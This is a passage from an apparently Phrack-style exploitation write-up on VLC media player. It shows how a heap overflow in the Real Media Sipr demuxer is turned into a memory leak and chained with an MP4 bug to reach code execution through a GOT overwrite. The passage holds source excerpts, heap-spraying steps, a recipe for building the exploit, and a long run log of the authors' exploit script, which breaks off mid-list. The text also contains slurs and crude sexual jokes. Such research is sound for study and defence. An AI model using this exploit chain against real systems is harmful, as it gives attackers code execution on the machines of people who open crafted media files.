+features, will just copy 'ass_traffic.mp4' to 'dup.mp4' thus duplicating
+the input stream to a standard file. Furthermore, if VLC is running in
+daemon mode, it is possible for the user to specify a different output
+MRL (Media Resource Location) per media file. For example, assume that
+VLC was started using the command line 'VLC --rc-host 127.0.0.1:8080';
+connecting to port 8080 using netcat and issuing the command...
+
+
+add /tmp/ass_traffic.mp4 :sout=#std{access=file,mux=raw,dst=/tmp/dup.mp4}
+
+
+...will, obviously, do the exact same thing. If we could discover an
+information leak, transcoding would be the perfect way of actually having
+VLC return leaked data back to us. For example, what if we could force VLC
+treat arbitrary memory addresses as simple sound information? If we manage
+to do that, then with the help of the transcoding features we could ask
+VLC to dump the memory range in question in a standard file in /tmp :)
+
+  Note: The truth is that we first focused on exploiting a vulnerability
+  that we could turn into a memory disclosure and then explored the
+  transcoding stuff. We decided to talk about transcoding first so that
+  the reader can keep it in mind while studying the RMF vulnerability
+  in the sections that follow.
+
+In the days that followed we thoroughly analyzed several public
+vulnerabilities. A specific commit diff in VLC's git caught our attention.
+It was a vulnerability regarding the Real Media format parser discovered by
+Hossein Lotfi [6]. Before actually touching the Real Media demuxer, a quick
+look in the media format itself is essential.
+
+
+----[ 4.2 - RMF? What's that?
+
+Source code for the real media demuxer can be found in
+modules/demux/real.c; the code itself is not very complex and can be easily
+analyzed in couple of hours. From what we've understood by studying the
+source, there are two kinds of Real Media files; the Real Audio (.ra)
+files, as well as the Real Media Format (.rmf) files. In fact, the two
+formats are quite similar with the one being a newer version of the other.
+Audio information is split in tracks, usually interleaved, so that a file
+may have several tracks each one encoded using a different audio codec.
+
+The vulnerability we will be analyzing can be triggered with a specially
+crafted RMF file that utilizes the Sipr audio codec (see [7] and [8]).
+
+The meta-information present in RMF files is split in various chunks;
+simple headers followed by their data. A special chunk, called MDPR
+(MeDia PRoperties) is used to encode information regarding a track in
+the RMF file (each track has its own associated MDPR header); its name,
+its duration, its title as well as the track identifier, a simple 32-bit
+integer.
+
+The sound information, the one you hear when playing a file, is split in
+packets, each one carrying the track ID for the track whose data it
+contains (as we have already mentioned, track data may be interleaved, so
+the file parser has to know what packet belongs to what track). The sipr
+codec goes further by allowing a packet to contain subpackets. When a
+packet with multiple subpackets is encountered, its contents are buffered
+until all subpackets have been processed. It's only then when the data
+in sent to your audio card or to any pending output streams ;)
+
+Sipr subpacket handling is where the mess begins...
+
+
+----[ 4.3 - Vulnerability details
+
+Every time a new packet is encountered in the input stream, VLC will check
+the track it belongs and figure out the audio codec for the track in
+question. Depending on this information, the appropriate audio demuxer is
+called. For sipr packets, 'DemuxAudioSipr()' is the function responsible
+for this task.
+
+
+/* modules/demux/real.c:788 */
+static void DemuxAudioSipr(..., real_track_t *tk, ...) {
+  ...
+
+  block_t *p_block = tk->p_sipr_packet;
+  ...
+
+  /* First occurance of a subpacket for this packet? Create a new block
+   * to buffer all the subpackets.
+   *
+   * Subpackets have a size equal to 'i_frame_size' and 'i_subpacket_h' is
+   * their number.
+   */
+  if(!p_block) {
+    /* (1) */
+    p_block = block_New(..., tk->i_frame_size * tk->i_subpacket_h);
+    ...
+
+    tk->p_sipr_packet = p_block;
+  }
+
+  /* (2) */
+  memcpy(p_block->p_buffer + tk->i_sipr_subpacket_count * tk->i_frame_size,
+    p_sys->buffer, tk->i_frame_size);
+  ...
+
+  /* Checks that all subpackets for this packet have been processed, if not
+   * returns to the demuxer.
+   */
+  if(++tk->i_sipr_subpacket_count < tk->i_subpacket_h)
+    return;
+  ...
+
+  /* All subpackets arrived; send data to all consumers. */
+  es_out_Send(p_demux->out, tk->p_es, p_block);
+}
+
+
+For now assume that 'block_New()', called at (1), is a simple call to
+'malloc()'. Obviously, setting 'i_subpacket_h' to 0 will result in a call
+very similar to 'malloc(0)'. As we have mentioned in our main jemalloc
+paper, a call to 'malloc(0)' returns a region of the smallest size class.
+If 'i_frame_size' is bigger than the minimal space reserved by 'malloc(0)',
+then the call to 'memcpy()' at (2) will result in neighboring heap
+allocations being corrupted (that simple ;p).
+
+
+----[ 4.4 - 'p_blocks' all over the place
+
+Since we have successfully identified the vulnerability, it is time
+to search for possible target structures. Before continuing, we must
+have a look at that 'block_t' structure used to buffer the subpackets;
+its definition can be found at include/vlc_block.h:101.
+
+
+typedef void (*block_free_t) (block_t *);
+
+struct block_t {
+  block_t      *p_next;
+  uint32_t     i_flags;
+  mtime_t      i_pts;
+  mtime_t      i_dts;
+  mtime_t      i_length;
+  unsigned     i_nb_samples;
+  int          i_rate;
+  size_t       i_buffer;
+  uint8_t      *p_buffer;
+  block_free_t pf_release;
+};
+
+
+I know what you're probably thinking; stop staring at that function
+pointer ;) Yes we can very easily overflow it and consequently gain direct
+code execution. Nevertheless, we decided not to take the easy road;
+after all, we are only interested in forcing VLC leak memory contents
+back to us. Assume function pointers have not been discovered yet ;p
+The structure still looks quite promising; notice how 'i_buffer', the
+size of the audio data pointed by the 'p_buffer' pointer, lies before
+'p_buffer' itself... But what exactly is that 'p_buffer' anyway? When
+and how is it allocated?
+
+Here's another interesting story regarding audio blocks. Having a look
+at src/misc/block.c, line 99, in function 'block_Alloc()' reveals that
+block headers always lie before the data pointed by 'p_buffer'. When,
+for example, the user requests a block of 16 bytes, 'block_Alloc()' will
+add 16 to the metadata overhead, say N bytes, thus eventually allocating
+16 + N bytes. The 'p_data' pointer will then set to point to the start
+of the actual buffer, right after the 'block_t' header as depicted below.
+
+
+                     p_buffer
+                     .-----.
+                     |     |
+                     |     v
+                .---------.----------------------.
+                | block_t |  ... audio data ...  |
+                '---------'----------------------'
+
+
+The relevant code is shown below:
+
+
+struct block_sys_t {
+  block_t self;
+  size_t  i_allocated_buffer;
+  uint8_t p_allocated_buffer[];
+};
+...
+
+#define BLOCK_ALIGN   16
+...
+
+#define BLOCK_PADDING 32
+...
+
+block_t *block_Alloc(size_t i_size) {
+  ...
+  block_sys_t *p_sys;
+  uint8_t *buf;
+
+#define ALIGN(x) (((x) + BLOCK_ALIGN - 1) & ~(BLOCK_ALIGN - 1))
+
+  /* (1) */
+  const size_t i_alloc = sizeof(*p_sys) + BLOCK_ALIGN +
+    (2 * BLOCK_PADDING) + ALIGN(i_size);
+
+  p_sys = malloc(i_alloc);
+  ...
+
+  /* 'buf' is assigned to 'block_t->p_buffer' by 'block_Init()' */
+  buf = (void *)ALIGN((uintptr_t)p_sys->p_allocated_buffer);
+  buf += BLOCK_PADDING;
+  block_Init(&p_sys->self, buf, i_size);
+  ...
+
+  return &p_sys->self;
+}
+
+
+Taking a look back at 'DemuxAudioSipr()', we can see that if
+'i_subpacket_h' is set to 0, then 'block_New()', a macro that is
+substituted with 'block_Alloc()', results in the latter receiving a
+value for 'i_size' equal to 0. Setting 'i_size' to 0 at (1), results in
+'i_alloc' being assigned the value 136. Now do the math; 136 is slightly
+larger than 128 so, it will be serviced by jemalloc's bin for 192-byte
+regions. 192 - 136 = 56; 56 is the size margin for the parameter passed
+to 'block_Alloc()'; for the blocks to be placed one next to the other,
+they must reside in the same size class, so, we must make sure the total
+length of the subpackets does not exceed 56. For a packet containing
+two subpackets, a wise choice is to set 'i_frame_size' to 20, so that 2 *
+20 (< 56) plus the overhead is also serviced by bin-192. Unfortunately,
+'i_frame_size' cannot take arbitrary values; it can only get a set of
+predefined ones with 20 being the smallest.
+
+Beautiful! Since 'block_t' allocations are always accompanied by their
+buffer, it means that the 'memcpy()' call at (2) in 'DemuxAudioSipr()',
+when writing past the boundaries of the victim buffer, may actually
+overwrite the header of an adjacent audio block; its 'p_buffer', its
+'i_buffer' and even its function pointer (but let's ignore this fact for
+now; abusing the function pointer is trivial and we decided not to deal
+with it).
+
+Now, a few more things to note:
+
+1 - We know that if one packet has two, for example, subpackets, then
+its 'p_block' will be alive until all subpackets have been processed;
+when they are no longer needed, they will be freed resulting in a small
+hole in the heap. Obviously, the lifetime of a 'p_block' is directly
+related to the number of its subpackets.
+
+2 - Checking at how 'DemuxAudioSipr()' works, reveals that a packet
+with 0 subpackets is treated as if it had 1 subpacket. The 'memcpy()'
+call at (2) will overflow the adjacent heap regions and then, when its
+processing has finished, the packet will be freed by 'es_out_Send()'.
+
+By combining the facts above, turns out we can:
+
+1 - Use the RMF metadata (MDPR chunks) to define two tracks. Both
+tracks must use the sipr audio codec. Each packet of the first must
+have 2 subpackets and each packet of the second 0 subpackets for the
+vulnerability to be triggered.
+
+2 - Force VLC play the first subpacket of a packet of the first track. A
+new 'block_t' will be allocated. In the diagram below, 't1s1' stands for
+'track 1 subpacket 1'.
+
+
+                .---------.-------.
+                | block_t |  t1s1 |
+                '---------'-------'
+
+
+3 - Force VLC to play the packet of the second track; the one that has
+0 subpackets. A new 'block_t' will eventually be allocated. We have
+to specially prepare the heap so that the new block is placed directly
+behind the one initialized at step 2.
+
+
+                .---------.------..---------.------.
+                | block_t | t2s0 || block_t | t1s1 |
+                '---------'------''---------'------'
+
+
+An overflow will take place thus overwriting the block header of the
+block allocated in the previous step. We are interested in overwriting
+the 'p_buffer' to make it point to a memory region of our choice and
+'i_buffer' to the number of bytes we want to be leaked.
+
+4 - Feed VLC with the second subpacket for the first track. Since the
+first subpacket was processed at step 2, the old 'block_t' will be
+used. If everything goes fine, its 'p_buffer' will point where we set
+it to and 'i_buffer' will contain a size of our choice. The 'memcpy()'
+call at (2) in 'DemuxAudioSipr()' will write 'i_frame_size' bytes at our
+chosen address thus trashing the memory a bit, but when 'es_out_Send()'
+is called, 'i_buffer' bytes starting at the address 'p_buffer' points to
+will be sent to the soundcard or any output stream requested by the user!
+
+  Note: Well yeah it wasn't that simple... 'es_out_Send()' calls a hell of
+  other functions to process the audio blocks, break them down in smaller
+  blocks, forward them to the output streams and so on. Debugging this
+  process was a very tiresome task; it became apparent that the target,
+  the overflown 'block_t' header had to obey to certain rules so that
+  it wasn't discarded. For example, all packets carry a timestamp;
+  the timestamp of the overflown block must be within a range of valid
+  timestamps, otherwise it's considered stale and dropped!
+
+The following logs correspond to one of our early tests; we used a
+specially crafted .rmf file to leak 65k of data starting at the binary's
+.data section.
+
+      [hk@lsd ~/src/vlc_exp/leak]$ cat youporn.sh
+      vlc leak.rmf :sout='#std{access=file,mux=raw,dst=leaked_data.rmf}' \
+        vlc://quit
+
+      [hk@lsd ~/src/vlc_exp/leak]$ source youporn.sh
+      VLC media player 1.1.8 The Luggage (revision exported)
+      ...
+      [hk@lsd ~/src/vlc_exp/leak]$ ls -lah leaked_data.rmf
+      -rwxr-xr-x  1 hk  hk   128K Mar 31 22:27 leaked_data.rmf
+
+We got back 128k which is about twice as much as we requested. In fact,
+the useful data is 65k; it just happens that it's written in the output
+file twice (minor detail related to block buffering).
+
+Careful readers would have probably noticed that we took for granted that
+the victim block will be allocated right before the target. Such a result
+can easily be achieved. The technique we use in our exploit is very
+similar to one of the techniques used in browser exploitation. Briefly,
+we create several tracks (more than 2000) holding packets of 2 subpackets
+of 20 bytes each so that all packets end up being allocated in bin-192. We
+then force the release of two consecutive allocations thus creating two
+adjacent holes in the heap. Then, by following what was said so far,
+we can achieve a reliable information disclosure. Our tests show that
+we can repeat this process around 40 times before VLC crashes (yet this
+is only statistics, beautiful Greek statistics ;p).
+
+
+----[ 4.5 - RMF summary
+
+It's now time to sum up the information leak process. For a successful
+information disclosure, the attacker must perform the following steps:
+
+1 - Create 2000 + 1 + 1 tracks. 2000 will be used for heap spraying,
+1 will act as the target and 1 as the victim. The lots of allocations
+will probably result in a new magazine being populated thus guaranteeing
+that new allocations will be returned in the reverse memory order.
+
+2 - Force the deallocation of two packets belonging to two consecutive
+tracks. Two adjacent holes will be created. The packet lower in memory
+must be freed first.
+
+3 - Play the first subpacket of the target track. The hole in the higher
+address will be assigned to the new block.
+
+4 - Play the packet of the victim track. The new block will be given the
+lower heap hole and the overflow will reach the block allocated at step 3.
+
+5 - Play the second subpacket of the target track. The memory we want
+to read will be trashed by 20 bytes (= frame size) and then returned in
+the output stream.
+
+6 - Watch the epic faggotry evolving in front of your eyes ;)
+
+
+--[ 5 - Building a reliable exploit
+
+----[ 5.1 - Overall process
+
+Building a reliable local exploit involves combining all the facts
+and finding a way to locate, within the target process, all pieces of
+information required to achieve code execution. Remember that we don't
+want the user having to manually find any return addresses, return
+locations and so on. The exploit must be autonomous and self contained;
+all required information must be automatically detected.
+
+When it comes to the MP4 vulnerability, things are pretty straightforward;
+we just need to figure out where 'p_root' is and then free it.
+Additionally, we need to figure out what value 'p_moov' must be overwritten
+with (i.e. the address of an appropriate .got entry). MP4 exploitation is
+100% reliable; once we have found the values of those two parameters, code
+execution is matter of feeding VLC with a specially crafted MP4 file. For
+more information the reader can have a look at the attached source code and
+more specifically at 'mp4.py'; a Python class used to create those special
+MP4 files that can crash VLC as well as innocent ones that cause no
+problems. The latter are used to force VLC load 'libmp4_plugin.so' during
+the very first step of the exploitation process.
+
+Briefly the exploit we developed performs the following steps:
+
+1 - Forces VLC to play an innocent MP4 file so that the target plugin
+is loaded.
+
+2 - Parses the ELF headers of the VLC binary in order to locate the
+absolute address of its .got section.
+
+3 - Uses a specially crafted RMF file to leak 65k starting at the address
+of the binary's .got.
+
+4 - The second entry in the .got table points to the linkmap; a linked
+list that keeps track of the loaded libraries populated by the loader
+on each call to 'dlopen()'. Each entry holds the name of a library, the
+address it's mapped at and so on. We proceed by leaking 1MB of data
+starting from the address of the first linkmap entry.
+
+5 - Step 4 is repeated until 'libmp4_plugin.so' is detected in the leaked
+data. VLC loads more than 100 libraries; there's no need to locate them
+all. Once we got the MP4 plugin entry, we can figure out where exactly
+it has been loaded.
+
+6 - By statically inspecting the MP4 plugin and by using the information
+collected at step 5, we can find the absolute address of its .got. The MP4
+vulnerability is triggered within this .so; consequently the overwrite
+must take place within its local .got.
+
+7 - The relocation entries, the string table and the symbol table
+indicated by the .dynamic section of the MP4 plugin can be properly
+combined to figure out what .got entry corresponds to what symbol name. We
+choose to overwrite the .got entry for 'memset()' (more on this later).
+The absolute address of the 'memset()' .got entry is then calculated
+and used as the value that will be written in 'p_moov'.
+
+8 - A set of possible addresses for 'p_root' is created by leaking and
+analyzing specific heap regions. This step is further analyzed later.
+
+9 - A final MP4 file is created. The MP4 file frees all 'p_root'
+candidates, uses 'chpl' boxes containing the shellcode to force jemalloc
+give the original 'p_root' region back and lands VLC on the 'unlink()'
+style pointer exchange. The address of 'p_root', which now contains user
+supplied data, is written in the .got entry of 'memset()'.
+
+10 - Shellcode is executed, much rejoicing is had ;)
+
+So why did we choose to hook 'memset()'? Turns out that once the MP4 file
+parsing has finished and the 'unlink()' tyle code has been triggered,
+VLC calls 'MP4_BoxDumpStructure()' to print the layout of the MP4 file
+(this is always done by default; no verbose flags required). Since we
+have corrupted the boxes, 'MP4_BoxDumpStructure()' may access invalid
+memory and thus segfault. To avoid such a side effect, we have to hook
+the first external function call. As shown below, this call corresponds to
+'memset()' which suits us just fine ;)
+
+
+static void __MP4_BoxDumpStructure(..., MP4_Box_t *p_box, ...)
+{
+  MP4_Box_t *p_child;
+
+  if( !i_level )
+  {
+    ...
+  }
+  else
+  {
+    ...
+    memset(str, ' ', sizeof(str));
+  }
+  ...
+
+  p_child = p_box->p_first;
+  while(p_child)
+  {
+    __MP4_BoxDumpStructure(..., p_child, ...);
+    p_child = p_child->p_next;
+  }
+}
+
+
+----[ 5.2 - Detecting 'p_root' address candidates
+
+At first we thought that this would be the easier part of the exploitation
+process; it turned out that it was actually the most difficult. Our first
+idea was to play an MP4 file several times and then leak memory in the
+hope that certain 'MP4_Box_t' signatures may be present somewhere in the
+heap. Unfortunately, the 64-byte allocations used by the MP4 plugin, are
+later used by the RMF parser thus destroying any useful evidence. After
+long nights and lots of tests, we came up with the following technique
+which turned out to be successful:
+
+Briefly, we do the following:
+
+1 - We leak 65k of data by overwriting 'i_buffer' and leaving 'p_buffer'
+at its present value. This way we read memory contents starting from
+the address that the victim 'p_block' is located.
+
+2 - As we have already discussed, the 'p_blocks' created by our RMF file
+are 192 bytes long, so, they lie within runs serviced by bin-192. Leaking
+data from where 'p_buffer' points, results in neighboring runs being
+leaked as well.
+
+3 - In our jemalloc article we mentioned that (a) runs are PAGE_SIZE
+aligned and (b) run headers start with a pointer to the corresponding
+bin. We analyze the leaked data and try to locate PAGE_SIZE aligned
+addresses that start with something that looks like a bin pointer
+(0x0804yyyy, some bytes after the main binary's .bss section).
+
+4 - We leak 65k starting from the binary's .bss section. The bins array
+of the main arena lies somewhere around. We analyze the data and locate
+the address of bin-64.
+
+5 - We leak about 7-8MB of commonly used heap regions. Since we now
+know the address of bin-64, we try to locate all runs that start with
+a pointer pointing at it, that is, runs that contain 64byte regions.
+
+6 - All regions in these runs will be freed by our MP4 file; 'p_root'
+is probably one of them.
+
+
+--[ 6 - Demonstration
+
+An art of exploitation paper serves nothing without the proper show off ;)
+This section was specially prepared to be hard sex for your eyes. We were
+very careful and, in fact, we spent many hours trying to figure out the
+leetest shellcode to use, but we couldn't come up with something more
+perfect than 'int3'.
+
+
+[hk@lsd ~]$ gdb -q vlc
+Reading symbols from xxx/bin/vlc...done.
+(gdb) run --rc-host 127.0.0.1:8080
+Starting program: xxx/bin/vlc --rc-host 127.0.0.1:8080
+...
+
+
+Let's run the exploit. The actual output may differ since the logs shown
+below do not correspond to the latest version of our code (oh and by
+the way, we are not fucking Python experts).
+
+
+[hk@lsd ~]$ python main.py
+usage: main.py <vlc_install_prefix> [<rc_port>]
+[hk@lsd ~]$ python main.py xxx/ 8080
+[~] Forcing VLC to load libmp4_plugin.so
+[~] Playing MP4 file 1 times
+.ok
+[~] .got address for VLC binary is 0x0804ad60
+[~] .got address for MP4 plugin is 0x00025e1c
+[~] Index of memset() in MP4's .got is 35
+[~] Requesing memory leak of .got
+[~] Leaking 65535 bytes 0x0804ad60-0x0805ad5f
+[~] Summary of our memory view
+  001 0x0804ad60-0x0805ad4a (65515 bytes)
+[~] Got 65515 bytes of useful data
+[~] Saving .got data in got.bin
+[~] Guessed linkmap address is 0x28088000
+[~] Requesting memory leak of linkmap
+[~] Leaking 4194304 bytes 0x28086000-0x28486000
+[~] Summary of our memory view
+  001 0x0804ad60-0x0805ad4a (65515 bytes)
+  002 0x28086000-0x28485feb (4194284 bytes)
+[~] Got 4194284 bytes of useful data
+[~] Saving linkmap partial data in linkmap-0x28086000.bin
+  001 0x08048000-0x00000000 unknown-0x08048000-0x00000000
+  002 0x2808e000-0x2817a084 libc.so.7
+  003 0x281a5000-0x281b95b4 libvlc.so.7
+  004 0x281bd000-0x28286234 libvlccore.so.4
+  005 0x282a7000-0x282e3c14 libdbus-1.so.3
+  006 0x282ed000-0x282f0814 librt.so.1
+  007 0x282f2000-0x28305a84 libm.so.5
+  008 0x2830c000-0x2831d334 libthr.so.3
+  009 0x28321000-0x28327d44 libintl.so.9
+  010 0x2832a000-0x28343eb4 libiconv.so.3
+  011 0x2842c000-0x2842ea84 liboss_plugin.so
+  012 0x28430000-0x28431734 libmemcpymmxext_plugin.so
+  013 0x28433000-0x284401b4 libaccess_bd_plugin.so
+  014 0x28442000-0x28443764 libaccess_mmap_plugin.so
+  015 0x28445000-0x28447c64 libfilesystem_plugin.so
+  016 0x2844a000-0x2844bc24 libdecomp_plugin.so
+  017 0x2844d000-0x2844ebd4 libstream_filter_rar_plugin.so
+  018 0x28450000-0x284563e4 libzip_plugin.so
+  019 0x28458000-0x28464a04 libz.so.5
+  020 0x2846a000-0x2846b244 libstream_filter_record_plugin.so
+  021 0x2846d000-0x2847e994 libplaylist_plugin.so
+  022 0x28482000-0x28483414 libxml_plugin.so
+  023 0x29300000-0x29402fb4 libxml2.so.5
+  024 0x28485000-0x2848a9c4 libhotkeys_plugin.so
+  025 0x2848d000-0x2848e384 libinhibit_plugin.so
+  026 0x28490000-0x28490fb4 libsignals_plugin.so
+  027 0x28493000-0x28494bd4 libglobalhotkeys_plugin.so
+  028 0x28497000-0x284982c4 libxcb-keysyms.so.1
+  029 0x2849a000-0x284af254 libxcb.so.2
+  030 0x284b2000-0x284b3754 libXau.so.6
+  031 0x284b5000-0x284b7b14 libXdmcp.so.6
+  032 0x284ba000-0x284ba574 libpthread-stubs.so.0
+  033 0x284bc000-0x284c43f4 liboldrc_plugin.so
+  034 0x284c8000-0x284e9da4 libmp4_plugin.so
+[~] MP4 plugin is mmap'ed at 0x284c8000-0x284e9da4
+[~] Absolute .got address for MP4 plugin at 0x284ede1c
+[~] .got address of memset() is 0x284edea8
+[~] .bss address for VLC binary is 0x0804adec
+[~] Searching for bin[] address candidates
+[~] Leaking 131070 bytes from current location
+[~] Got 131050 bytes of useful data
+0x0804c0a0...ok
+[~] Leaking 65535 bytes 0x0804adec-0x0805adeb
+[~] Summary of our memory view
+  001 0x0804ad60-0x0805ad4a (65515 bytes)
+  002 0x28086000-0x28485feb (4194284 bytes)
+  003 0x0804adec-0x0805add6 (65515 bytes)
+[~] Got 65515 bytes of useful data
+[~] bin-64 runcur at 0x2891a000, bin address 0x0804bfd8
+[~] Playing MP4 file 16 times
+................ok
+[~] Leaking 7340032 bytes 0x28700000-0x28e00000
+[~] Summary of our memory view
+  001 0x0804ad60-0x0805ad4a (65515 bytes)
+  002 0x28086000-0x28485feb (4194284 bytes)
+  003 0x0804adec-0x0805add6 (65515 bytes)
+  004 0x28700000-0x28dfffeb (7340012 bytes)
+[~] Got 7340012 bytes of useful data
+[~] Trying to locate target runs for bin-64 at 0x0804c0a0
+  64byte region run at 0x28912000
+  64byte region run at 0x28919000
+  64byte region run at 0x2891a000
+  64byte region run at 0x28933000
+  64byte region run at 0x289fc000
+  64byte region run at 0x289fd000
+  64byte region run at 0x289fe000
+  64byte region run at 0x28b32000
+  64byte region run at 0x28b33000
+  64byte region run at 0x28b34000
+  64byte region run at 0x28b36000
+  64byte region run at 0x28b37000
+  64byte region run at 0x28b38000
+  64byte region run at 0x28b39000
+  64byte region run at 0x28b3a000
+  64byte region run at 0x28b3b000
+  64byte region run at 0x28bac000
+  64byte region run at 0x28bad000
+  64byte region run at 0x28bae000
+  64byte region run at 0x28baf000
+[~] Constructing final MP4 payload
+[~] Will free the following memory regions
+0x28912080...0x289120c0...0x28912100...0x28912140...0x28912180...
+0x289121c0...0x28912200...0x28912240...0x28912280...0x289122c0...
+0x28912300...0x28912340...0x28912380...0x289123c0...0x28912400...
+0x28912440...0x28912480...0x289124c0...0x28912500...0x28912540...
+0x28912580...0x289125c0...0x28912600...0x28912640...0x28912680...
+0x289126c0...0x28912700...0x28912740...0x28912780...0x289127c0...
+0x28912800...0x28912840...0x28912880...0x289128c0...0x28912900...
+0x28912940...0x28912980...0x289129c0...0x28912a00...0x28912a40...
+0x28912a80...0x28912ac0...0x28912b00...0x28912b40...0x28912b80...
+0x28912bc0...0x28912c00...0x28912c40...0x28912c80...0x28912cc0...
+0x28912d00...0x28912d40...0x28912d80...0x28912dc0...0x28912e00...
+0x28912e40...0x28912e80...0x28912ec0...0x28912f00...0x28912f40...
+0x28912f80...0x28912fc0...0x28919080...0x289190c0...0x28919100...
+0x28919140...0x28919180...0x289191c0...0x28919200...0x28919240...
+0x28919280...0x289192c0...0x28919300...0x28919340...0x28919380...
+0x289193c0...0x28919400...0x28919440...0x28919480...0x289194c0...
+0x28919500...0x28919540...0x28919580...0x289195c0...0x28919600...
+0x28919640...0x28919680...0x289196c0...0x28919700...0x28919740...
+0x28919780...0x289197c0...0x28919800...0x28919840...0x28919880...
+0x289198c0...0x28919900...0x28919940...0x28919980...0x289199c0...
+0x28919a00...0x28919a40...0x28919a80...0x28919ac0...0x28919b00...
+0x28919b40...0x28919b80...0x28919bc0...0x28919c00...0x28919c40...
+0x28919c80...0x28919cc0...0x28919d00...0x28919d40...0x28919d80...
+0x28919dc0...0x28919e00...0x28919e40...0x28919e80...0x28919ec0...
+0x28919f00...0x28919f40...0x28919f80...0x28919fc0...0x2891a080...
+0x2891a0c0...0x2891a100...0x2891a140...0x2891a180...0x2891a1c0...
+0x2891a200...0x2891a240...0x2891a280...0x2891a2c0...0x2891a300...
+0x2891a340...0x2891a380...0x2891a3c0...0x2891a400...0x2891a440...
+0x2891a480...0x2891a4c0...0x2891a500...0x2891a540...0x2891a580...
+0x2891a5c0...0x2891a600...0x2891a640...0x2891a680...0x2891a6c0...
+0x2891a700...0x2891a740...0x2891a780...0x2891a7c0...0x2891a800...
+0x2891a840...0x2891a880...0x2891a8c0...0x2891a900...0x2891a940...
+0x2891a980...0x2891a9c0...0x2891aa00...0x2891aa40...0x2891aa80...
+0x2891aac0...0x2891ab00...0x2891ab40...0x2891ab80...0x2891abc0...
+0x2891ac00...0x2891ac40...0x2891ac80...0x2891acc0...0x2891ad00...
+0x2891ad40...0x2891ad80...0x2891adc0...0x2891ae00...0x2891ae40...
+0x2891ae80...0x2891aec0...0x2891af00...0x2891af40...0x2891af80...
+0x2891afc0...0x28933080...0x289330c0...0x28933100...0x28933140...
+0x28933180...0x289331c0...0x28933200...0x28933240...0x28933280...
+0x289332c0...0x28933300...0x28933340...0x28933380...0x289333c0...
+0x28933400...0x28933440...0x28933480...0x289334c0...0x28933500...
+0x28933540...0x28933580...0x289335c0...0x28933600...0x28933640...
+0x28933680...0x289336c0...0x28933700...0x28933740...0x28933780...
+0x289337c0...0x28933800...0x28933840...0x28933880...0x289338c0...
+0x28933900...0x28933940...0x28933980...0x289339c0...0x28933a00...
+0x28933a40...0x28933a80...0x28933ac0...0x28933b00...0x28933b40...
+0x28933b80...0x28933bc0...0x28933c00...0x28933c40...0x28933c80...
+0x28933cc0...0x28933d00...0x28933d40...0x28933d80...0x28933dc0...
+0x28933e00...0x28933e40...0x28933e80...0x28933ec0...0x28933f00...
+0x28933f40...0x28933f80...0x28933fc0...0x289fc080...0x289fc0c0...
+0x289fc100...0x289fc140...0x289fc180...0x289fc1c0...0x289fc200...
+0x289fc240...0x289fc280...0x289fc2c0...0x289fc300...0x289fc340...
+0x289fc380...0x289fc3c0...0x289fc400...0x289fc440...0x289fc480...
+0x289fc4c0...0x289fc500...0x289fc540...0x289fc580...0x289fc5c0...
+0x289fc600...0x289fc640...0x289fc680...0x289fc6c0...0x289fc700...
+0x289fc740...0x289fc780...0x289fc7c0...0x289fc800...0x289fc840...
+0x289fc880...0x289fc8c0...0x289fc900...0x289fc940...0x289fc980...
+0x289fc9c0...0x289fca00...0x289fca40...0x289fca80...0x289fcac0...
+0x289fcb00...0x289fcb40...0x289fcb80...0x289fcbc0...0x289fcc00...
+0x289fcc40...0x289fcc80...0x289fccc0...0x289fcd00...0x289fcd40...
+0x289fcd80...0x289fcdc0...0x289fce00...0x289fce40...0x289fce80...
+0x289fcec0...0x289fcf00...0x289fcf40...0x289fcf80...0x289fcfc0...
+0x289fd080...0x289fd0c0...0x289fd100...0x289fd140...0x289fd180...
+0x289fd3c0...0x289fd400...0x289fd440...0x289fd480...0x289fd4c0...
+0x289fd500...0x289fd540...0x289fd580...0x289fd5c0...0x289fd600...
+0x289fd640...0x289fd680...0x289fd6c0...0x289fd700...0x289fd740...
+0x289fd780...0x289fd7c0...0x289fd800...0x289fd840...0x289fd880...
+0x289fd8c0...0x289fd900...0x289fd940...0x289fd980...0x289fd9c0...
+0x289fda00...0x289fda40...0x289fda80...0x289fdac0...0x289fdb00...
+0x289fdb40...0x289fdb80...0x289fdbc0...0x289fdc00...0x289fdc40...
+0x289fdc80...0x289fdcc0...0x289fdd00...0x289fdd40...0x289fdd80...
+0x289fddc0...0x289fde00...0x289fde40...0x289fde80...0x289fdec0...
+0x289fdf00...0x289fdf40...0x289fdf80...0x289fdfc0...0x289fe080...
+0x289fe0c0...0x289fe100...0x289fe140...0x289fe180...0x289fe1c0...
+0x289fe200...0x289fe240...0x289fe280...0x289fe2c0...0x289fe300...
+0x289fe340...0x289fe380...0x289fe3c0...0x289fe400...0x289fe440...
+0x289fe480...0x289fe4c0...0x289fe500...0x289fe540...0x289fe580...
+0x289fe5c0...0x289fe600...0x289fe640...0x289fe680...0x289fe6c0...
+0x289fe700...0x289fe740...0x289fe780...0x289fe7c0...0x289fe800...
+0x289fe840...0x289fe880...0x289fe8c0...0x289fe900...0x289fe940...
+0x289fe980...0x289fe9c0...0x289fea00...0x289fea40...0x289fea80...
+0x289feac0...0x289feb00...0x289feb40...0x289feb80...0x289febc0...
+0x289fec00...0x289fec40...0x289fec80...0x289fecc0...0x289fed00...
+0x289fed40...0x289fed80...0x289fedc0...0x289fee00...0x289fee40...
+0x289fee80...0x289feec0...0x289fef00...0x289fef40...0x289fef80...
+0x289fefc0...0x28b32080...0x28b320c0...0x28b32100...0x28b32140...
+0x28b32180...0x28b321c0...0x28b32200...0x28b32240...0x28b32280...
+0x28b322c0...0x28b32300...0x28b32340...0x28b32380...0x28b323c0...
+0x28b32400...0x28b32440...0x28b32480...0x28b324c0...0x28b32500...
+0x28b32540...0x28b32580...0x28b325c0...0x28b32600...0x28b32640...
+0x28b32680...0x28b326c0...0x28b32700...0x28b32740...0x28b32780...
+0x28b327c0...0x28b32800...0x28b32840...0x28b32880...0x28b328c0...
+0x28b32900...0x28b32940...0x28b32980...0x28b329c0...0x28b32a00...
+0x28b32a40...0x28b32a80...0x28b32ac0...0x28b32b00...0x28b32b40...
+0x28b32b80...0x28b32bc0...0x28b32c00...0x28b32c40...0x28b32c80...
+0x28b32cc0...0x28b32d00...0x28b32d40...0x28b32d80...0x28b32dc0...
+0x28b32e00...0x28b32e40...0x28b32e80...0x28b32ec0...0x28b32f00...
+0x28b32f40...0x28b32f80...0x28b32fc0...0x28b33080...0x28b330c0...
+0x28b33100...0x28b33140...0x28b33180...0x28b331c0...0x28b33200...
+0x28b33240...0x28b33280...0x28b332c0...0x28b33300...0x28b33340...
+0x28b33380...0x28b333c0...0x28b33400...0x28b33440...0x28b33480...
